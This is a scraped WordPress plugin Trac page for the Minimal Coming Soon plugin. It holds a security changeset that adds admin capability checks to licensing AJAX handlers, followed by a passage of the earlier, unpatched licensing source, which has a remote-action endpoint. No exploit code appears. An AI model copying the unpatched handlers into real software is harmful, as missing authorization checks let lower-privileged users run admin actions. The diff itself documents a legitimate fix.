  | 563 | 563 | check\_ajax\_referer('wf\_licensing\_' . $this->prefix); |
  | 564 | 564 |  |
  |  | 565 | if (false === current\_user\_can('manage\_options')) { |
  |  | 566 | wp\_die('Sorry, you have to be an admin to run this action.'); |
  |  | 567 | } |
  |  | 568 |  |
  | 565 | 569 | $license\_key = trim($\_REQUEST['license\_key']); |
  | 566 | 570 | if (empty($license\_key)) { |
  | […](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/wf-licensing.php?rev=3031149#L586) | […](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/wf-licensing.php?rev=3099123#L590) |  |
  | 586 | 590 | { |
  | 587 | 591 | check\_ajax\_referer('wf\_licensing\_' . $this->prefix); |
  |  | 592 |  |
  |  | 593 | if (false === current\_user\_can('manage\_options')) { |
  |  | 594 | wp\_die('Sorry, you have to be an admin to run this action.'); |
  |  | 595 | } |
  | 588 | 596 |  |
  | 589 | 597 | $old\_license = $this->get\_license(); |
  | […](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/wf-licensing.php?rev=3031149#L598) | […](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/wf-licensing.php?rev=3099123#L606) |  |
  | 598 | 606 | check\_ajax\_referer('wf\_licensing\_' . $this->prefix); |
  | 599 | 607 |  |
  |  | 608 | if (false === current\_user\_can('manage\_options')) { |
  |  | 609 | wp\_die('Sorry, you have to be an admin to run this action.'); |
  |  | 610 | } |
  |  | 611 |  |
  | 600 | 612 | $out['license\_key'] = trim(sanitize\_text\_field($\_POST['license\_key'])); |
  | 601 | 613 |  |
* ## [minimal-coming-soon-maintenance-mode/trunk/minimal-coming-soon-maintenance-mode.php](/changeset/3099123/minimal-coming-soon-maintenance-mode/trunk/minimal-coming-soon-maintenance-mode.php "Show the changeset 3099123 restricted to minimal-coming-soon-maintenance-mode/trunk/minimal-coming-soon-maintenance-mode.php")

  | [r3031149](/browser/minimal-coming-soon-maintenance-mode/trunk/minimal-coming-soon-maintenance-mode.php?rev=3031149#L4 "Show revision 3031149 of this file in browser") | [r3099123](/browser/minimal-coming-soon-maintenance-mode/trunk/minimal-coming-soon-maintenance-mode.php?rev=3099123#L4 "Show revision 3099123 of this file in browser") |  |
  | --- | --- | --- |
  | 4 | 4 | \* Plugin URI: https://comingsoonwp.com/ |
  | 5 | 5 | \* Description: Simply awesome coming soon & maintenance mode plugin. Super-simple to use. MailChimp support built-in. |
  | 6 |  | \* Version: 2.3~~8~~ |
  |  | 6 | \* Version: 2.39 |
  | 7 | 7 | \* Requires at least: 4.0 |
  | 8 | 8 | \* Requires PHP: 5.2 |
  | 9 |  | \* Tested up to: 6.~~4~~ |
  |  | 9 | \* Tested up to: 6.5 |
  | 10 | 10 | \* Author: WebFactory Ltd |
  | 11 | 11 | \* Author URI: https://www.webfactoryltd.com/ |
* ## [minimal-coming-soon-maintenance-mode/trunk/readme.txt](/changeset/3099123/minimal-coming-soon-maintenance-mode/trunk/readme.txt "Show the changeset 3099123 restricted to minimal-coming-soon-maintenance-mode/trunk/readme.txt")

  | [r3031149](/browser/minimal-coming-soon-maintenance-mode/trunk/readme.txt?rev=3031149#L1 "Show revision 3031149 of this file in browser") | [r3099123](/browser/minimal-coming-soon-maintenance-mode/trunk/readme.txt?rev=3099123#L1 "Show revision 3099123 of this file in browser") |  |
  | --- | --- | --- |
  | 1 | 1 | === Minimal Coming Soon – Coming Soon Page === |
  | 2 | 2 | Contributors: WebFactory |
  | 3 |  | Tags: coming soon, coming soon page, maintenance mode, ~~maintenance mode page, coming soon mode, under construction, maintenance mode page, landing page, subscribe form, maintenance, coming soon builder, coming soon status~~ |
  |  | 3 | Tags: coming soon, coming soon page, maintenance mode, coming soon mode, coming soon builder |
  | 4 | 4 | Requires at least: 4.0 |
  | 5 | 5 | Requires PHP: 5.2 |
  | 6 |  | Tested up to: 6.~~4~~ |
  | 7 |  | Stable tag: 2.3~~8~~ |
  |  | 6 | Tested up to: 6.5 |
  |  | 7 | Stable tag: 2.39 |
  | 8 | 8 | License: GPLv3 |
  | 9 | 9 | License URI: http://www.gnu.org/licenses/gpl-3.0.html |
  | […](/browser/minimal-coming-soon-maintenance-mode/trunk/readme.txt?rev=3031149#L24) | […](/browser/minimal-coming-soon-maintenance-mode/trunk/readme.txt?rev=3099123#L24) |  |
  | 24 | 24 | = Coming Soon Plugin Features = |
  | 25 | 25 |  |
  | 26 |  | \* Check out <a href="https://comingsoonwp.com/themes/">~~2~~00+ themes</a> that come with the PRO version, <a href="https://comingsoonwp.com/image-filters/">26+ Instagram filters</a> and <a href="https://comingsoonwp.com/content-animations/">47+ spectacular content animations</a> for Coming Soon Pages |
  |  | 26 | \* Check out <a href="https://comingsoonwp.com/themes/">300+ themes</a> that come with the PRO version, <a href="https://comingsoonwp.com/image-filters/">26+ Instagram filters</a> and <a href="https://comingsoonwp.com/content-animations/">47+ spectacular content animations</a> for Coming Soon Pages |
  | 27 | 27 | \* Works with all WordPress themes and plugins |
  | 28 | 28 | \* Completely customizable look and feel including background color, cover image, fonts, logo |
  | […](/browser/minimal-coming-soon-maintenance-mode/trunk/readme.txt?rev=3031149#L95) | […](/browser/minimal-coming-soon-maintenance-mode/trunk/readme.txt?rev=3099123#L95) |  |
  | 95 | 95 | == Changelog == |
  | 96 | 96 |  |
  |  | 97 | = 2.39 = |
  |  | 98 | \* 2024-06-07 |
  |  | 99 | \* minor security fixes |
  |  | 100 |  |
  | 97 | 101 | = 2.38 = |
  | 98 | 102 | \* 2024-02-04 |

**Note:** See [TracChangeset](/wiki/TracChangeset)
for help on using the changeset viewer.

[Trac UI Preferences](/prefs)
### Download in other formats:

* [Unified Diff](?format=diff&new=3099123)
* [Zip Archive](?format=zip&new=3099123)

* [About](https://wordpress.org/about/)
* [News](https://wordpress.org/news/)
* [Hosting](https://wordpress.org/hosting/)
* [Donate](https://wordpressfoundation.org/donate/)
* [Swag](https://mercantile.wordpress.org/)

* [Documentation](https://wordpress.org/documentation/)
* [Developers](https://developer.wordpress.org/)
* [Get Involved](https://make.wordpress.org/)
* [Learn](https://learn.wordpress.org/)

* [Showcase](https://wordpress.org/showcase/)
* [Plugins](https://wordpress.org/plugins/)
* [Themes](https://wordpress.org/themes/)
* [Patterns](https://wordpress.org/patterns/)

* [WordCamp](https://central.wordcamp.org/)
* [WordPress.TV](https://wordpress.tv/)
* [BuddyPress](https://buddypress.org/)
* [bbPress](https://bbpress.org/)

* [WordPress.com](https://wordpress.com/?ref=wporg-footer)
* [Matt](https://ma.tt/)
* [Privacy](https://wordpress.org/about/privacy/)
* [Public Code](https://publiccode.eu/)

[WordPress.org](https://wordpress.org/)

[WordPress.org](https://wordpress.org/)

* [Visit our Facebook page](https://www.facebook.com/WordPress/)
* [Visit our Twitter account](https://twitter.com/WordPress)
* [Visit our Instagram account](https://www.instagram.com/wordpress/)
* [Visit our LinkedIn account](https://www.linkedin.com/company/wordpress)

![Code is Poetry](https://s.w.org/style/images/code-is-poetry-for-dark-bg.svg)



=== Content from plugins.trac.wordpress.org_613ea35d_20250111_113435.html ===


[Skip to content](#main)

[WordPress.org](https://wordpress.org/)

* [News](https://wordpress.org/news/)
* [Download & Extend](https://wordpress.org/download/)
  + [Get WordPress](https://wordpress.org/download/)
  + [Themes](https://wordpress.org/themes/)
  + [Patterns](https://wordpress.org/patterns/)
  + [Plugins](https://wordpress.org/plugins/)
  + [Mobile](https://wordpress.org/mobile/)
  + [Hosting](https://wordpress.org/hosting/)
  + [Openverse ↗︎](https://openverse.org/)
* [Learn](https://learn.wordpress.org/)
  + [Learn WordPress](https://learn.wordpress.org/)
  + [Documentation](https://wordpress.org/documentation/)
  + [Forums](https://wordpress.org/support/forums/)
  + [Developers](https://developer.wordpress.org/)
  + [WordPress.tv ↗︎](https://wordpress.tv/)
* [Community](https://make.wordpress.org/)
  + [Make WordPress](https://make.wordpress.org/)
  + [Photo Directory](https://wordpress.org/photos/)
  + [Five for the Future](https://wordpress.org/five-for-the-future/)
  + [WordCamp ↗︎](https://central.wordcamp.org/)
  + [Meetups ↗︎](https://www.meetup.com/pro/wordpress/)
  + [Job Board ↗︎](https://jobs.wordpress.net/)
* [About](https://wordpress.org/about/)
  + [About WordPress](https://wordpress.org/about/)
  + [Showcase](https://wordpress.org/showcase/)
  + [Enterprise](https://wordpress.org/enterprise/)
  + [Gutenberg ↗︎](https://wordpress.org/gutenberg/)
  + [WordPress Swag Store ↗︎](https://mercantile.wordpress.org/)
* [Get WordPress](https://wordpress.org/download/)

Search Trac

[Get WordPress](https://wordpress.org/download/)

## [Plugin Directory](//wordpress.org/plugins/)

Search:

* [Login](https://login.wordpress.org/?redirect_to=http%3A%2F%2Fplugins.trac.wordpress.org%2Fbrowser%2Fminimal-coming-soon-maintenance-mode%2Ftags%2F2.38%2Fframework%2Fwf-licensing.php)

* [Timeline](/timeline)
* [View Tickets](/report)
* [Browse Source](/browser)

## Context Navigation

* ← [Previous Revision](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/wf-licensing.php?rev=2543111 "Revision 2543111")
* [Next Revision](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/wf-licensing.php?rev=3099123 "Revision 3099123") →
* [Blame](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/wf-licensing.php?annotate=blame "Annotate each line with the last changed revision (this can be time consuming...)")
* [Revision Log](/log/minimal-coming-soon-maintenance-mode/tags/2.38/framework/wf-licensing.php)

---

# [source:](/browser?order=name "Go to repository root") [minimal-coming-soon-maintenance-mode](/browser/minimal-coming-soon-maintenance-mode?order=name "View minimal-coming-soon-maintenance-mode")/[tags](/browser/minimal-coming-soon-maintenance-mode/tags?order=name "View tags")/[2.38](/browser/minimal-coming-soon-maintenance-mode/tags/2.38?order=name "View 2.38")/[framework](/browser/minimal-coming-soon-maintenance-mode/tags/2.38/framework?order=name "View framework")/[wf-licensing.php](/browser/minimal-coming-soon-maintenance-mode/tags/2.38/framework/wf-licensing.php?order=name "View wf-licensing.php")

View diff against:

View revision:

| [Last change](/changeset/3031149/minimal-coming-soon-maintenance-mode/trunk/framework/wf-licensing.php "View differences") on this file was [3031149](/changeset/3031149/ "View changeset 3031149"), checked in by WebFactory, [11 months ago](/timeline?from=2024-02-04T14%3A33%3A27Z&precision=second "See timeline at 02/04/2024 02:33:27 PM") |
| --- |
| Bug fixes |
| **File size:** 20.8 KB | |

| Line |  |
| --- | --- |
| [1](#L1) | <?php |
| [2](#L2) | if (false === class\_exists('WF\_Licensing\_CSMM')) { |
| [3](#L3) | class WF\_Licensing\_CSMM |
| [4](#L4) | { |
| [5](#L5) | public $prefix = ''; |
| [6](#L6) | private $licensing\_servers = array(); |
| [7](#L7) | private $version = ''; |
| [8](#L8) | private $slug = ''; |
| [9](#L9) | private $basename = ''; |
| [10](#L10) | private $plugin\_page = ''; |
| [11](#L11) | private $plugin\_file = ''; |
| [12](#L12) | private $js\_folder = ''; |
| [13](#L13) | protected $api\_ver = 'v1/'; |
| [14](#L14) | protected $valid\_forever = '2035-01-01'; |
| [15](#L15) | protected $unlimited\_installs = 99999; |
| [16](#L16) | public $disable\_remote = true; |
| [17](#L17) | public $debug = false; |
| [18](#L18) |  |
| [19](#L19) |  |
| [20](#L20) | /\*\* |
| [21](#L21) | \* Init licensing by setting up various params and hooking into actions. |
| [22](#L22) | \* |
| [23](#L23) | \* @param array $params Prefix, licensing\_servers, version, plugin\_file, skip\_hooks |
| [24](#L24) | \* |
| [25](#L25) | \* @return void |
| [26](#L26) | \*/ |
| [27](#L27) | function \_\_construct($params) |
| [28](#L28) | { |
| [29](#L29) | $this->prefix = trim($params['prefix']); |
| [30](#L30) | $this->licensing\_servers = $params['licensing\_servers']; |
| [31](#L31) | $this->version = trim($params['version']); |
| [32](#L32) | $this->slug = dirname(plugin\_basename(trim($params['plugin\_file']))); |
| [33](#L33) | $this->basename = plugin\_basename(trim($params['plugin\_file'])); |
| [34](#L34) | $this->plugin\_file = $params['plugin\_file']; |
| [35](#L35) | $this->plugin\_page = trim($params['plugin\_page']); |
| [36](#L36) | $this->disable\_remote = !empty($params['disable\_remote']); |
| [37](#L37) | $this->debug = !empty($params['debug']); |
| [38](#L38) |  |
| [39](#L39) | if ($params['js\_folder']) { |
| [40](#L40) | $this->js\_folder = trim($params['js\_folder']); |
| [41](#L41) | } else { |
| [42](#L42) | $this->js\_folder = plugin\_dir\_url($this->plugin\_file) . 'js/'; |
| [43](#L43) | } |
| [44](#L44) |  |
| [45](#L45) | if (empty($params['skip\_hooks'])) { |
| [46](#L46) | register\_activation\_hook($this->plugin\_file, array($this, 'activate\_plugin')); |
| [47](#L47) | register\_deactivation\_hook($this->plugin\_file, array($this, 'deactivate\_plugin')); |
| [48](#L48) |  |
| [49](#L49) | add\_action('init', array($this, 'init')); |
| [50](#L50) |  |
| [51](#L51) | add\_action('wp\_ajax\_wf\_licensing\_' . $this->prefix . '\_validate', array($this, 'validate\_ajax')); |
| [52](#L52) | add\_action('wp\_ajax\_wf\_licensing\_' . $this->prefix . '\_save', array($this, 'save\_ajax')); |
| [53](#L53) |  |
| [54](#L54) | add\_action('wp\_ajax\_wf\_licensing\_' . $this->prefix . '\_deactivate', array($this, 'deactivate\_ajax')); |
| [55](#L55) | } |
| [56](#L56) |  |
| [57](#L57) | $this->log('\_\_construct', $params, get\_object\_vars($this)); |
| [58](#L58) |  |
| [59](#L59) | add\_action('wf\_licensing\_' . trim($this->prefix, '\_') . '\_remote\_action\_refresh', array($this, 'remote\_action\_refresh')); |
| [60](#L60) | add\_action('wf\_licensing\_' . trim($this->prefix, '\_') . '\_remote\_action\_deactivate\_license', array($this, 'remote\_action\_deactivate\_license')); |
| [61](#L61) | add\_action('wf\_licensing\_' . trim($this->prefix, '\_') . '\_remote\_action\_validate\_license', array($this, 'remote\_action\_validate\_license')); |
| [62](#L62) |  |
| [63](#L63) | add\_action('plugins\_loaded', array($this, 'monitor\_remote\_actions')); |
| [64](#L64) | } // \_\_construct |
| [65](#L65) |  |
| [66](#L66) |  |
| [67](#L67) | /\*\* |
| [68](#L68) | \* Actions performed on WP init action. |
| [69](#L69) | \* |
| [70](#L70) | \* @return void |
| [71](#L71) | \*/ |
| [72](#L72) | function init() |
| [73](#L73) | { |
| [74](#L74) | if (is\_admin()) { |
| [75](#L75) | add\_action('admin\_enqueue\_scripts', array($this, 'admin\_enqueue\_scripts')); |
| [76](#L76) | } |
| [77](#L77) | } // init |
| [78](#L78) |  |
| [79](#L79) |  |
| [80](#L80) | function admin\_enqueue\_scripts() { |
| [81](#L81) | $current\_screen = get\_current\_screen(); |
| [82](#L82) |  |
| [83](#L83) | if (empty($current\_screen->id) || $current\_screen->id != $this->plugin\_page) { |
| [84](#L84) | return false; |
| [85](#L85) | } |
| [86](#L86) |  |
| [87](#L87) | $vars = array( |
| [88](#L88) | 'prefix' => $this->prefix, |
| [89](#L89) | 'debug' => $this->debug, |
| [90](#L90) | 'nonce' => wp\_create\_nonce('wf\_licensing\_' . $this->prefix), |
| [91](#L91) | 'licensing\_endpoint' => $this->licensing\_servers[0] . $this->api\_ver, |
| [92](#L92) | 'request\_data' => array( |
| [93](#L93) | 'action' => 'validate\_license', |
| [94](#L94) | 'license\_key' => '', |
| [95](#L95) | 'rand' => rand(1000, 9999), |
| [96](#L96) | 'version' => $this->version, |
| [97](#L97) | 'wp\_version' => get\_bloginfo('version'), |
| [98](#L98) | 'site\_url' => get\_home\_url(), |
| [99](#L99) | 'site\_title' => get\_bloginfo('name'), |
| [100](#L100) | 'meta' => array() |
| [101](#L101) | ) |
| [102](#L102) | ); |
| [103](#L103) |  |
| [104](#L104) | wp\_enqueue\_script('wf\_licensing', $this->js\_folder . 'wf-licensing.js', array(), 1.0, true); |
| [105](#L105) | wp\_localize\_script('wf\_licensing', 'wf\_licensing\_' . $this->prefix, $vars); |
| [106](#L106) | } // admin\_enqueue\_scripts |
| [107](#L107) |  |
| [108](#L108) |  |
| [109](#L109) | function monitor\_remote\_actions() |
| [110](#L110) | { |
| [111](#L111) | if ($this->disable\_remote || is\_admin()) { |
| [112](#L112) | return; |
| [113](#L113) | } |
| [114](#L114) |  |
| [115](#L115) | if (!empty($\_REQUEST[$this->prefix . '\_access\_key']) && !empty($\_REQUEST[$this->prefix . '\_action']) && isset($\_REQUEST[$this->prefix . '\_action\_params'])) { |
| [116](#L116) | $access\_key = substr(trim($\_REQUEST[$this->prefix . '\_access\_key']), 0, 32); |
| [117](#L117) | $action = substr(trim($\_REQUEST[$this->prefix . '\_action']), 0, 32); |
| [118](#L118) | $action\_params = $\_REQUEST[$this->prefix . '\_action\_params']; |
| [119](#L119) | $rand = substr($\_REQUEST[$this->prefix . '\_rand'], 0, 5); |
| [120](#L120) | $rand = preg\_replace("/[^0-9]/", '', $rand); |
| [121](#L121) |  |
| [122](#L122) | nocache\_headers(); |
| [123](#L123) | header('X-WF-Licensing-' . $this->prefix . ': ' . $this->version); |
| [124](#L124) |  |
| [125](#L125) | if (strlen($rand) != 5) { |
| [126](#L126) | wp\_send\_json\_error('Invalid random value.'); |
| [127](#L127) | } |
| [128](#L128) |  |
| [129](#L129) | if (false == $this->is\_active(false, false, true)) { |
| [130](#L130) | wp\_send\_json\_error('License is not active.'); |
| [131](#L131) | } |
| [132](#L132) |  |
| [133](#L133) | if (false == $this->is\_remote\_action($action)) { |
| [134](#L134) | wp\_send\_json\_error('Unknown remote action.'); |
| [135](#L135) | } |
| [136](#L136) |  |
| [137](#L137) | $access\_key = preg\_replace("/[^0-9a-zA-Z]/", '', $access\_key); |
| [138](#L138) | if (strlen($access\_key) != 32) { |
| [139](#L139) | wp\_send\_json\_error('Invalid access key format.'); |
| [140](#L140) | } |
| [141](#L141) |  |
| [142](#L142) | $license = $this->get\_license(); |
| [143](#L143) | if ($access\_key != $license['access\_key']) { |
| [144](#L144) | wp\_send\_json\_error('Invalid access key.'); |
| [145](#L145) | } |
| [146](#L146) |  |
| [147](#L147) | $post\_data = @json\_decode(file\_get\_contents('php://input'), true); |
| [148](#L148) | do\_action('wf\_licensing\_' . trim($this->prefix, '\_') . '\_remote\_action\_' . $action, $action\_params, $this, $post\_data); |
| [149](#L149) |  |
| [150](#L150) | wp\_send\_json\_error('Remote action did not execute.'); |
| [151](#L151) | die(); |
| [152](#L152) | } |
| [153](#L153) | } // monitor\_remote\_actions |
| [154](#L154) |  |
| [155](#L155) |  |
| [156](#L156) | function remote\_action\_refresh($action\_params) |
| [157](#L157) | { |
| [158](#L158) | $data = $this->prepare\_server\_query\_data('remote\_refresh'); |
| [159](#L159) |  |
| [160](#L160) | wp\_send\_json\_success($data); |
| [161](#L161) | } // remote\_action\_refresh |
| [162](#L162) |  |
| [163](#L163) |  |
| [164](#L164) | function remote\_action\_validate\_license($action\_params) |
| [165](#L165) | { |
| [166](#L166) | $validate = $this->validate(); |
| [167](#L167) | $license = $this->get\_license(); |
| [168](#L168) |  |
| [169](#L169) | wp\_send\_json\_success(array('validate' => $validate, 'license' => $license)); |
| [170](#L170) | } // remote\_action\_validate\_license |
| [171](#L171) |  |
| [172](#L172) |  |
| [173](#L173) | function remote\_action\_deactivate\_license($action\_params) |
| [174](#L174) | { |
| [175](#L175) | $license = $this->get\_license(); |
| [176](#L176) | $this->update\_license(false); |
| [177](#L177) |  |
| [178](#L178) | if ($action\_params['keep\_license\_key']) { |
| [179](#L179) | $tmp = array('error' => 'License is no longer valid for this site.', 'license\_key' => $license['license\_key']); |
| [180](#L180) | $this->update\_license($tmp); |
| [181](#L181) | } |
| [182](#L182) |  |
| [183](#L183) | wp\_send\_json\_success(); |
| [184](#L184) | } // remote\_action\_deactivate\_license |
| [185](#L185) |  |
| [186](#L186) |  |
| [187](#L187) | private function is\_remote\_action($action) |
| [188](#L188) | { |
| [189](#L189) | $actions = array('refresh', 'validate\_license', 'deactivate\_license'); |
| [190](#L190) | $actions = apply\_filters('wf\_licensing\_' . trim($this->prefix, '\_') . '\_remote\_actions', $actions); |
| [191](#L191) |  |
| [192](#L192) | if (in\_array($action, $actions)) { |
| [193](#L193) | return true; |
| [194](#L194) | } else { |
| [195](#L195) | return false; |
| [196](#L196) | } |
| [197](#L197) | } // is\_remote\_action |
| [198](#L198) |  |
| [199](#L199) |  |
| [200](#L200) | /\*\* |
| [201](#L201) | \* Log message if debugging is enabled. |
| [202](#L202) | \* Log file: /wp-content/wf-licensing.log |
| [203](#L203) | \* |
| [204](#L204) | \* @param string $message Message to write to log. |
| [205](#L205) | \* @param mixed $data Optional, extra data to write to debug log. |
| [206](#L206) | \* |
| [207](#L207) | \* @return void |
| [208](#L208) | \*/ |
| [209](#L209) | function log($message, ...$data) |
| [210](#L210) | { |
| [211](#L211) | if (!$this->debug) { |
| [212](#L212) | return; |
| [213](#L213) | } |
| [214](#L214) |  |
| [215](#L215) | $log\_file = trailingslashit(WP\_CONTENT\_DIR) . 'wf-licensing.log'; |
| [216](#L216) | $fp = fopen($log\_file, 'a+'); |
| [217](#L217) |  |
| [218](#L218) | fputs($fp, '[' . date('r') . '] ' . $this->prefix . ': '); |
| [219](#L219) | fputs($fp, (string) $message . PHP\_EOL); |
| [220](#L220) | foreach ($data as $tmp) { |
| [221](#L221) | fputs($fp, print\_r($tmp, true)); |
| [222](#L222) | } |
| [223](#L223) |  |
| [224](#L224) | fputs($fp, PHP\_EOL); |
| [225](#L225) | fclose($fp); |
| [226](#L226) | } // log |
| [227](#L227) |  |
| [228](#L228) |  |
| [229](#L229) | /\*\* |
| [230](#L230) | \* Fetches license details from the database. |
| [231](#L231) | \* |
| [232](#L232) | \* @param string $key If set returns only requested options key. |
| [233](#L233) | \* |
| [234](#L234) | \* @return string |
| [235](#L235) | \*/ |
| [236](#L236) | function get\_license($key = '') |
| [237](#L237) | { |
| [238](#L238) | $default = array( |
| [239](#L239) | 'license\_key' => '', |
| [240](#L240) | 'error' => '', |
| [241](#L241) | 'valid\_until' => '', |
| [242](#L242) | 'last\_check' => 0, |
| [243](#L243) | 'name' => '', |
| [244](#L244) | 'access\_key' => '', |
| [245](#L245) | 'meta' => array() |
| [246](#L246) | ); |
| [247](#L247) |  |
| [248](#L248) | $options = get\_option('wf\_licensing\_' . $this->prefix, array()); |
| [249](#L249) | $options = array\_merge($default, $options); |
| [250](#L250) |  |
| [251](#L251) | if (empty($options['access\_key'])) { |
| [252](#L252) | $options['access\_key'] = $this->generate\_access\_key(); |
| [253](#L253) | $this->update\_license($options); |
| [254](#L254) | } |
| [255](#L255) |  |
| [256](#L256) | if (!empty($key)) { |
| [257](#L257) | return $options[$key]; |
| [258](#L258) | } else { |
| [259](#L259) | return $options; |
| [260](#L260) | } |
| [261](#L261) | } // get\_license |
| [262](#L262) |  |
| [263](#L263) |  |
| [264](#L264) | function generate\_access\_key() |
| [265](#L265) | { |
| [266](#L266) | $keyspace = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'; |
| [267](#L267) | $pieces = array(); |
| [268](#L268) | $max = strlen($keyspace) - 1; |
| [269](#L269) |  |
| [270](#L270) | for ($i = 0; $i < 32; ++$i) { |
| [271](#L271) | $pieces[] = $keyspace[random\_int(0, $max)]; |
| [272](#L272) | } |
| [273](#L273) | return implode('', $pieces); |
| [274](#L274) | } // generate\_access\_key |
| [275](#L275) |  |
| [276](#L276) |  |
| [277](#L277) | function get\_license\_formatted($key = '') |
| [278](#L278) | { |
| [279](#L279) | $license = $this->get\_license(); |
| [280](#L280) | $out = array( |
| [281](#L281) | 'name' => '', |
| [282](#L282) | 'name\_long' => '', |
| [283](#L283) | 'valid\_until' => '', |
| [284](#L284) | 'expires' => '', |
| [285](#L285) | 'license\_key' => '', |
| [286](#L286) | 'license\_key\_hidden' => '', |
| [287](#L287) | 'recurring' => false, |
| [288](#L288) | 'keyless' => false, |
| [289](#L289) | ); |
| [290](#L290) |  |
| [291](#L291) | if (!$this->is\_active()) { |
| [292](#L292) | return $out; |
| [293](#L293) | } |
| [294](#L294) | $license['valid\_until'] = $license['valid\_until']; |
| [295](#L295) |  |
| [296](#L296) | $out['name'] = $license['name']; |
| [297](#L297) | $out['name\_long'] = $license['name']; |
| [298](#L298) | if ($license['meta']) { |
| [299](#L299) | $tmp = ''; |
| [300](#L300) | foreach ($license['meta'] as $meta => $meta\_value) { |
| [301](#L301) |  |
| [302](#L302) | if ($meta[0] == '\_' || filter\_var($meta\_value, FILTER\_VALIDATE\_BOOLEAN) != true) { |
| [303](#L303) | continue; |
| [304](#L304) | } |
| [305](#L305) | $meta = str\_replace('\_', ' ', $meta); |
| [306](#L306) | $meta = ucwords($meta); |
| [307](#L307) | $tmp .= $meta . ', '; |
| [308](#L308) | } |
| [309](#L309) | $tmp = trim($tmp, ', '); |
| [310](#L310) | if ($tmp) { |
| [311](#L311) | $out['name\_long'] .= ' with ' . $tmp; |
| [312](#L312) | } |
| [313](#L313) | } |
| [314](#L314) |  |
| [315](#L315) | if ($license['valid\_until'] == $this->valid\_forever) { |
| [316](#L316) | $out['valid\_until'] = 'forever'; |
| [317](#L317) | $out['recurring'] = false; |
| [318](#L318) | } else { |
| [319](#L319) | $out['valid\_until'] = 'until ' . date(get\_option('date\_format'), strtotime($license['valid\_until'])); |
| [320](#L320) | $out['recurring'] = true; |
| [321](#L321) | } |
| [322](#L322) |  |
| [323](#L323) | if (date('Y-m-d') == $license['valid\_until']) { |
| [324](#L324) | $out['expires'] = 'today'; |
| [325](#L325) | } elseif (date('Y-m-d', time() + 30 \* DAY\_IN\_SECONDS) > $license['valid\_until']) { |
| [326](#L326) | $tmp = (strtotime($license['valid\_until'] . date(' G:i:s')) - time()) / DAY\_IN\_SECONDS; |
| [327](#L327) | $out['expires'] = 'in ' . round($tmp) . ' days'; |
| [328](#L328) | } else { |
| [329](#L329) | $out['expires'] = 'in more than 30 days'; |
| [330](#L330) | } |
| [331](#L331) |  |
| [332](#L332) | if (empty($license['license\_key']) || $license['license\_key'] == 'keyless') { |
| [333](#L333) | $out['keyless'] = true; |
| [334](#L334) | } else { |
| [335](#L335) | $out['keyless'] = false; |
| [336](#L336) | $out['license\_key'] = $license['license\_key']; |
| [337](#L337) | $tmp = strlen($license['license\_key']); |
| [338](#L338) | $dash = false; |
| [339](#L339) | $new = ''; |
| [340](#L340) | for ($i = $tmp - 1; $i >= 0; $i--) { |
| [341](#L341) | if ($dash == false || $out['license\_key'][$i] == '-') { |
| [342](#L342) | $new = $out['license\_key'][$i] . $new; |
| [343](#L343) | } else { |
| [344](#L344) | $new = '\*' . $new; |
| [345](#L345) | } |
| [346](#L346) | if ($out['license\_key'][$i] == '-') { |
| [347](#L347) | $dash = true; |
| [348](#L348) | } |
| [349](#L349) | } |
| [350](#L350) | $out['license\_key\_hidden'] = $new; |
| [351](#L351) | } |
| [352](#L352) |  |
| [353](#L353) | $out = apply\_filters('wf\_licensing\_license\_formatted\_' . $this->prefix, $out); |
| [354](#L354) |  |
| [355](#L355) | if (!empty($key)) { |
| [356](#L356) | return $out[$key]; |
| [357](#L357) | } else { |
| [358](#L358) | return $out; |
| [359](#L359) | } |
| [360](#L360) | } // get\_license\_formatted |
| [361](#L361) |  |
| [362](#L362) |  |
| [363](#L363) | /\*\* |
| [364](#L364) | \* Updates license details in the database. |
| [365](#L365) | \* |
| [366](#L366) | \* @param string $data License data to save; or empty to delete license |
| [367](#L367) | \* |
| [368](#L368) | \* @return bool |
| [369](#L369) | \*/ |
| [370](#L370) | function update\_license($data = false) |
| [371](#L371) | { |
| [372](#L372) | if (false === $data) { |
| [373](#L373) | $tmp = delete\_option('wf\_licensing\_' . $this->prefix); |
| [374](#L374) | } else { |
| [375](#L375) | if (!isset($data['access\_key'])) { |
| [376](#L376) | $data['access\_key'] = $this->get\_license('access\_key'); |
| [377](#L377) | } |
| [378](#L378) | $tmp = update\_option('wf\_licensing\_' . $this->prefix, $data); |
| [379](#L379) | } |
| [380](#L380) |  |
| [381](#L381) | return $tmp; |
| [382](#L382) | } // update\_license |
| [383](#L383) |  |
| [384](#L384) |  |
| [385](#L385) | /\*\* |
| [386](#L386) | \* Check if license is valid |
| [387](#L387) | \* |
| [388](#L388) | \* @param string $feature If set it checks for a specific feature. |
| [389](#L389) | \* @param bool $force\_check Forces license recheck on server instead of just cached values. |
| [390](#L390) | \* |
| [391](#L391) | \* @return boolean |
| [392](#L392) | \*/ |
| [393](#L393) | function is\_active($feature = '', $force\_check = false, $local\_only = false) |
| [394](#L394) | { |
| [395](#L395) | $last\_check = $this->get\_license('last\_check'); |
| [396](#L396) | if ($local\_only == false) { |
| [397](#L397) | if ($force\_check || ($last\_check && ($last\_check + HOUR\_IN\_SECONDS \* 8) < time())) { |
| [398](#L398) | $this->log('auto recheck license'); |
| [399](#L399) | $this->validate(); |
| [400](#L400) | } |
| [401](#L401) | } |
| [402](#L402) |  |
| [403](#L403) | $license = $this->get\_license(); |
| [404](#L404) |  |
| [405](#L405) | if ( |
| [406](#L406) | !empty($license['license\_key']) && !empty($license['name']) && |
| [407](#L407) | !empty($license['valid\_until']) && $license['valid\_until'] >= date('Y-m-d') |
| [408](#L408) | ) { |
| [409](#L409) | if (!empty($feature)) { |
| [410](#L410) | if (!empty($license['meta'][$feature]) && filter\_var($license['meta'][$feature], FILTER\_VALIDATE\_BOOLEAN) == true) { |
| [411](#L411) | return true; |
| [412](#L412) | } else { |
| [413](#L413) | return false; |
| [414](#L414) | } |
| [415](#L415) | } else { |
| [416](#L416) | return true; |
| [417](#L417) | } |
| [418](#L418) | } else { |
| [419](#L419) | return false; |
| [420](#L420) | } |
| [421](#L421) | } // is\_active |
| [422](#L422) |  |
| [423](#L423) |  |
| [424](#L424) | /\*\* |
| [425](#L425) | \* Hook to plugin activation action. |
